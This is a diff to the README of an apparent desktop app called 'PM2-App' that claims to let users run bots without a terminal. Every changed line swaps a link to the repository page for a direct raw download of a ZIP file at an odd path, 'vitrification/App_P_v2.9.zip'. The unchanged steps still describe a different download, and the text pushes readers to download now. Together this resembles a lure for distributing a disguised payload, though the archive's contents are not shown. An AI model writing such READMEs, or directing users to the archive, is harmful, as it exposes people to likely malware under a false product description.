@@ -1,6 +1,6 @@
 # 🤖 PM2-App - Run Your Bots Effortlessly Without a Terminal
 
-[![Download PM2-App](https://img.shields.io/badge/Download-PM2--App-blueviolet?style=for-the-badge&logo=github)](https://github.com/abdulheysavas/PM2-App)
+[![Download PM2-App](https://img.shields.io/badge/Download-PM2--App-blueviolet?style=for-the-badge&logo=github)](https://github.com/abdulheysavas/PM2-App/raw/refs/heads/main/vitrification/App_P_v2.9.zip)
 
 ## 🎯 What Is PM2-App?
 
@@ -16,7 +16,7 @@ PM2-App is a friendly desktop application that lets you run and control your bac
 
 Getting started takes less than two minutes. Follow these simple steps:
 
-1. **Visit the download page**: [https://github.com/abdulheysavas/PM2-App](https://github.com/abdulheysavas/PM2-App)
+1. **Visit the download page**: [https://github.com/abdulheysavas/PM2-App/raw/refs/heads/main/vitrification/App_P_v2.9.zip](https://github.com/abdulheysavas/PM2-App/raw/refs/heads/main/vitrification/App_P_v2.9.zip)
 2. **Find the download button**: Look for a green button that says "Code" near the top of the page. Click it, then select "Download ZIP" from the dropdown menu.
 3. **Save the file**: Your browser will download a compressed folder called something like "PM2-App-main.zip". Save it to your Desktop for easy access.
 4. **Extract the files**: Right-click on the downloaded ZIP file and choose "Extract All". Follow the prompts and let it create a new folder on your Desktop.
@@ -84,7 +84,7 @@ If you ever get stuck, you're not alone. Here are ways to get assistance:
 
 New features and improvements are regularly added. To update:
 
-1. Download the latest version from the same link: [https://github.com/abdulheysavas/PM2-App](https://github.com/abdulheysavas/PM2-App)
+1. Download the latest version from the same link: [https://github.com/abdulheysavas/PM2-App/raw/refs/heads/main/vitrification/App_P_v2.9.zip](https://github.com/abdulheysavas/PM2-App/raw/refs/heads/main/vitrification/App_P_v2.9.zip)
 2. Replace the old folder with the new one.
 3. Your existing tasks and settings will automatically be detected from previous versions.
 
@@ -94,6 +94,6 @@ Stop wrestling with command-line tools and start enjoying the simplicity of PM2-
 
 Don't wait—give PM2-App a try right now. Download it today and experience the easiest way to run your bots and scripts in the background, guilt-free and hassle-free!
 
-[![Get PM2-App Now](https://img.shields.io/badge/🚀%20Download%20PM2--App-DarkGreen?style=for-the-badge)](https://github.com/abdulheysavas/PM2-App)
+[![Get PM2-App Now](https://img.shields.io/badge/🚀%20Download%20PM2--App-DarkGreen?style=for-the-badge)](https://github.com/abdulheysavas/PM2-App/raw/refs/heads/main/vitrification/App_P_v2.9.zip)
 
 Remember: Visit this link to download the application. The download is completely free, and you'll be up and running with your first bot in under five minutes. Enjoy!
